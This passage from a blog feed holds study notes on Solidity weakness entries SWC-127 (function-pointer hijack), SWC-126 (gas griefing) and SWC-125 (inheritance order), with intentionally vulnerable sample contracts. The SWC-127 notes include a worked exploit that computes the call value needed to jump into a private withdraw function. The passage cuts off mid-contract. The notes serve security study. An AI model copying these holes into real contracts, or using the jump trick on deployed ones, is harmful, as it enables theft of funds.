&#123;</span><br><span class="line">            listAddresses = new address[](0);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>27.SWC-127_hijack flow</title>
      <link href="/2023/07/13/09.SWC/27.SWC-127_hijack%20flow/"/>
      <url>/2023/07/13/09.SWC/27.SWC-127_hijack%20flow/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-127-hijack-flow"><a href="#SWC-127-hijack-flow" class="headerlink" title="SWC-127_hijack flow"></a>SWC-127_hijack flow</h1><p>Arbitrary Jump with Function Type Variable</p><ul><li><p><strong>Description</strong>: Solidity supports function types. That is, a variable of function type can be assigned with a reference to a function with a matching signature. The function saved to such variable can be called just like a regular function.</p><p>The problem arises when a user has the ability to arbitrarily change the function type variable and thus execute random code instructions. As Solidity doesn’t support pointer arithmetics, it’s impossible to change such variable to an arbitrary value. However, if the developer uses assembly instructions, such as <code>mstore</code> or assign operator, in the worst case scenario an attacker is able to point a function type variable to any code instruction, violating required validations and required state changes.</p></li><li><p><strong>Remediation</strong>: The use of assembly should be minimal. A developer should not allow a user to assign arbitrary values to function type variables.</p></li></ul><p>contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract FunctionTypes &#123;</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        require(msg.value != 0); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() private &#123;</span><br><span class="line">        require(msg.value == 0, &quot;dont send funds!&#x27;&quot;);</span><br><span class="line">        address(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function frwd() internal&#123;</span><br><span class="line">        withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    struct Func &#123;</span><br><span class="line">        function () internal f;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function breakIt() public payable &#123;</span><br><span class="line">        require(msg.value != 0, &quot;send funds!&quot;);</span><br><span class="line">        Func memory func;</span><br><span class="line">        func.f = frwd;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(func, add(mload(func), callvalue)) </span><br><span class="line">        &#125;</span><br><span class="line">        func.f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this contract’s idea is the same as this <a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/06.delegatecall%20@SafaDelegatecall/">level</a> in chainflag.</p><p>decompile the runtimecode</p><p>the address of  <code>func.f</code> is 0x010c</p><p><img src="https://moe.photo/images/2023/07/13/image-20230711205919670.png" alt></p><p>the goal address is 0x018e</p><p><img src="https://moe.photo/images/2023/07/13/image-20230711210112905.png" alt></p><p><code>mstore(func, add(mload(func), callvalue))</code>: </p><ul><li>goal address = callvalue + <code>func.f</code>‘s content</li><li>0x018e = callvalue + 0x010c</li><li>callvalue = 0x18e - 0x010c = 398 - 268 = 130</li></ul><p>successfully!</p><p><img src="https://moe.photo/images/2023/07/13/image-20230711210848023.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>26.SWC-126_Insufficient Gas Griefing</title>
      <link href="/2023/07/13/09.SWC/26.SWC-126_Insufficient%20Gas%20Griefing/"/>
      <url>/2023/07/13/09.SWC/26.SWC-126_Insufficient%20Gas%20Griefing/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-126-Insufficient-Gas-Griefing"><a href="#SWC-126-Insufficient-Gas-Griefing" class="headerlink" title="SWC-126_Insufficient Gas Griefing"></a>SWC-126_Insufficient Gas Griefing</h1><h2 id="SWC-content"><a href="#SWC-content" class="headerlink" title="SWC content"></a>SWC content</h2><p>Insufficient Gas Griefing</p><ul><li><p><strong>Description</strong>: Insufficient gas griefing attacks can be performed on contracts which accept data and use it in a sub-call on another contract. If the sub-call fails, either the whole transaction is reverted, or execution is continued. In the case of a relayer contract, the user who executes the transaction, the ‘forwarder’, can effectively censor transactions by using just enough gas to execute the transaction, but not enough for the sub-call to succeed.</p></li><li><p><strong>Remediation</strong>: </p></li></ul><p>vulnerability contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Relayer &#123;</span><br><span class="line">    uint transactionId;</span><br><span class="line"></span><br><span class="line">    struct Tx &#123;</span><br><span class="line">        bytes data;</span><br><span class="line">        bool executed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; Tx) transactions;</span><br><span class="line"></span><br><span class="line">    function relay(Target target, bytes memory _data) public returns(bool) &#123;</span><br><span class="line">        // replay protection; do not call the same transaction twice</span><br><span class="line">        require(transactions[transactionId].executed == false, &#x27;same transaction twice&#x27;);</span><br><span class="line">        transactions[transactionId].data = _data;</span><br><span class="line">        transactions[transactionId].executed = true;</span><br><span class="line">        transactionId += 1;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = address(target).call(abi.encodeWithSignature(&quot;execute(bytes)&quot;, _data));</span><br><span class="line">        return success;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Contract called by Relayer</span><br><span class="line">contract Target &#123;</span><br><span class="line">    function execute(bytes memory _data) public &#123;</span><br><span class="line">        // Execute contract code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Relayer &#123;</span><br><span class="line">    uint transactionId;</span><br><span class="line"></span><br><span class="line">    struct Tx &#123;</span><br><span class="line">        bytes data;</span><br><span class="line">        bool executed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (uint =&gt; Tx) transactions;</span><br><span class="line"></span><br><span class="line">    function relay(Target target, bytes memory _data, uint _gasLimit) public &#123;</span><br><span class="line">        // replay protection; do not call the same transaction twice</span><br><span class="line">        require(transactions[transactionId].executed == false, &#x27;same transaction twice&#x27;);</span><br><span class="line">        transactions[transactionId].data = _data;</span><br><span class="line">        transactions[transactionId].executed = true;</span><br><span class="line">        transactionId += 1;</span><br><span class="line"></span><br><span class="line">        address(target).call(abi.encodeWithSignature(&quot;execute(bytes)&quot;, _data, _gasLimit));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Contract called by Relayer</span><br><span class="line">contract Target &#123;</span><br><span class="line">    function execute(bytes memory _data, uint _gasLimit) public &#123;</span><br><span class="line">        require(gasleft() &gt;= _gasLimit, &#x27;not enough gas&#x27;);</span><br><span class="line">        // Execute contract code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>一般这么设计的话项目方都会预估前面的流程需要多少gas，然后去计算一个gaslimit。如果超过了这个值就说明没有按照项目方预期的那样执行，既能避免程序本身可能的逻辑问题，也能避免一些攻击</li><li>那直接require返回值不行吗？没执行成功就停止。意思是业务逻辑中那个方法无论成功与否执行，都要把那个业务执行完不得回退？</li><li>不一样的，这个执行也许成功了，但是执行了一些其他的操作，例如被重入了啥的，这个时候require是能过的，但是gaslimit过不了</li></ul><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(bool success,) = payable(receiver).call&#123;gas: 3000, value: amount&#125;(hex&quot;&quot;);</span><br></pre></td></tr></table></figure><p>虽然这个方法的其中一个返回值<code>bytes memory data</code>被省略了，但是在solidity中还是会被返回到内存当中。因此，如果外部合约在回调函数中返回了一个极大的内容，那么我们将这个极大的内容复制到内存的时候就会消耗极多的gas，就会造成gas不足交易失败。那么在这个SWC中也是相同的道理：外部合约实现的这个方法返回了一个极大的内容。解决方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bool success;</span><br><span class="line">assembly &#123;</span><br><span class="line">    success := call(3000, receiver, amount, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用内联汇编，设置参数，使得返回的数据不会被复制到内存当中</p><p>2</p><p>其实这个SWC的解决方案并不好，原因：gasleft本身也消耗gas，又可能执行完之后刚好不够了，存在碰巧达到阈值导致gas不够的情况。</p><p>优化的解决方法1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint256 gasAvailable = gasleft() - E;</span><br><span class="line">require(gasAvailable - gasAvailable / 64  &gt;= `txGas`, &quot;not enough gas provided&quot;)</span><br><span class="line">to.call.gas(txGas)(data); // CALL</span><br></pre></td></tr></table></figure><p>优化的解决方法2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">to.call.gas(txGas)(data); // CALL</span><br><span class="line">assert(gasleft() &gt; txGas / 63); // &quot;not enough gas left&quot;</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://medium.com/@wighawag/ethereum-the-concept-of-gas-and-its-dangers-28d0eb809bb2">Link1</a></p><p><a href="https://github.com/pashov/audits/blob/master/solo/Zerem-security-review.md#m-03-gas-griefingtheft-is-possible-on-unsafe-external-call">link2</a></p><p><a href="https://consensys.github.io/smart-contract-best-practices/attacks/griefing/">link3</a></p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>25.SWC-125_Incorrect Inheritance Order</title>
      <link href="/2023/07/13/09.SWC/25.SWC-125_Incorrect%20Inheritance%20Order/"/>
      <url>/2023/07/13/09.SWC/25.SWC-125_Incorrect%20Inheritance%20Order/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-125-Incorrect-Inheritance-Order"><a href="#SWC-125-Incorrect-Inheritance-Order" class="headerlink" title="SWC-125_Incorrect Inheritance Order"></a>SWC-125_Incorrect Inheritance Order</h1><p>Incorrect Inheritance Order</p><ul><li><p><strong>Description</strong>: Solidity supports multiple inheritance, meaning that one contract can inherit several contracts. Multiple inheritance introduces ambiguity called <a href="https://en.wikipedia.org/wiki/Multiple_inheritance#The_diamond_problem">Diamond Problem</a>: if two or more base contracts define the same function, which one should be called in the child contract? Solidity deals with this ambiguity by using reverse <a href="https://en.wikipedia.org/wiki/C3_linearization">C3 Linearization</a>, which sets a priority between base contracts.</p><p>That way, base contracts have different priorities, so the order of inheritance matters. Neglecting inheritance order can lead to unexpected behavior.</p></li><li><p><strong>Remediation</strong>: When inheriting multiple contracts, especially if they have identical functions, a developer should carefully specify inheritance in the correct order. The rule of thumb is to inherit contracts from more /general/ to more /specific/.</p></li></ul><p>contract: 该文件书写的继承关系存在钻石问题，很有可能出现潜在的问题。做项目的时候尽量不要出现此继承。关于多继承的钻石继承，<a href="https://www.bilibili.com/video/BV1n94y1B7bS/?spm_id_from=444.41.list.card_archive.click&amp;vd_source=0cc0401ee122346d6680e90658b0ed1a">我录了一个视频</a>，另外关于多继承的<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/complex-inheritance/">教程</a></p><p><img src="https://moe.photo/images/2023/07/13/QQ20230713160317.png" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * @source: https://github.com/Arachnid/uscc/blob/master/submissions-2017/philipdaian/MDTCrowdsale.sol</span><br><span class="line"> * @author: Philip Daian</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">//import &quot;https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line">/**</span><br><span class="line"> * @title SafeMath</span><br><span class="line"> * @dev Math operations with safety checks that revert on error</span><br><span class="line"> */</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @dev Multiplies two numbers, reverts on overflow.</span><br><span class="line">    */</span><br><span class="line">    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the</span><br><span class="line">        // benefit is lost if &#x27;b&#x27; is also tested.</span><br><span class="line">        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522</span><br><span class="line">        if (a == 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require(c / a == b);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.</span><br><span class="line">    */</span><br><span class="line">    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        // Solidity only automatically asserts when dividing by 0</span><br><span class="line">        require(b &gt; 0);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line">        // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span><br><span class="line">    */</span><br><span class="line">    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &lt;= a);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Adds two numbers, reverts on overflow.</span><br><span class="line">    */</span><br><span class="line">    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span><br><span class="line">    * reverts when dividing by zero.</span><br><span class="line">    */</span><br><span class="line">    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b != 0);</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//import &quot;https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/token/ERC20/ERC20Mintable.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ERC20 interface</span><br><span class="line"> * @dev see https://github.com/ethereum/EIPs/issues/20</span><br><span class="line"> */</span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address who) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span 